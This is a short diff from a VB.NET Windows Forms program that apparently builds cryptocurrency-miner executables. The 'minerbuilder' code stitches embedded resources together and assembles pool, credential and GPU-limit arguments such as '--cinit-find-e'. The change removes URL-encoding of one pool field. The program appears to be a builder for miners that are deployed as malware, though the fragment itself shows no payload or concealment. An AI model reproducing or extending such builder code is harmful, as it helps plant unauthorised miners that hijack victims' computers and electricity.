@@ -66,7 +66,7 @@ Public Class Form1
             txtLog.Text = txtLog.Text + ("Starting..." + vbNewLine)
             txtLog.Text = txtLog.Text + ("Replacing strings..." + vbNewLine)
             Dim minerbuilder As New StringBuilder(My.Resources.Program)
-            Dim argstr As String = " --cinit-find-e --pool=" & txtPoolScheme.Text.Split(" "c)(0) & "://" & "`" & txtPoolUsername.Text & "`" & If(String.IsNullOrEmpty(txtPoolWorker.Text), "", "." & txtPoolWorker.Text) & If(String.IsNullOrEmpty(txtPoolPassowrd.Text), "", ":" & txtPoolPassowrd.Text) & If(String.IsNullOrEmpty(txtPoolUsername.Text), "", "@") & txtPoolURL.Text & If(String.IsNullOrEmpty(txtPoolData.Text), "", "/" & HttpUtility.UrlEncode(txtPoolData.Text)) & " --cinit-max-gpu=" & txtMaxGPU.Text.Replace("%", "") & " " & If(FA.chkAdvanced.Checked, FA.txtAdvParam.Text, advancedParams)
+            Dim argstr As String = " --cinit-find-e --pool=" & txtPoolScheme.Text.Split(" "c)(0) & "://" & "`" & txtPoolUsername.Text & "`" & If(String.IsNullOrEmpty(txtPoolWorker.Text), "", "." & txtPoolWorker.Text) & If(String.IsNullOrEmpty(txtPoolPassowrd.Text), "", ":" & txtPoolPassowrd.Text) & If(String.IsNullOrEmpty(txtPoolUsername.Text), "", "@") & txtPoolURL.Text & If(String.IsNullOrEmpty(txtPoolData.Text), "", "/" & txtPoolData.Text) & " --cinit-max-gpu=" & txtMaxGPU.Text.Replace("%", "") & " " & If(FA.chkAdvanced.Checked, FA.txtAdvParam.Text, advancedParams)
 
             minerbuilder.Replace("#dll", Resources_dll)
             minerbuilder.Replace("#eth", Resources_eth)
